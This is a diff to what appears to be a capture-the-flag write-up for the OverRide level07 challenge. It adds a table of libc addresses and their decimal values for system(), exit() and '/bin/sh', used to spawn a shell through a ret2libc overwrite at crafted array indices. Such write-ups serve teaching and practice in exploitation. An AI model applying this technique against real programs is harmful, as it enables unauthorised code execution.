@@ -48,6 +48,11 @@ $2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
 ```
 
 5. We can now record the decimal value of the system() address at index 1073741938, then the one for exit() at index 115 and finally the one for "/bin/sh" at index 116. Once this is done, a shell will be launched when we try to exit the program:
+
+system()    0xf7e6aed0    4159090384
+exit()      0xf7e5eb70    4159040368
+"/bin/sh"   0xf7f897ec    4160264172
+
 ```
 level07@OverRide:~$ ./level07 
 ----------------------------------------------------
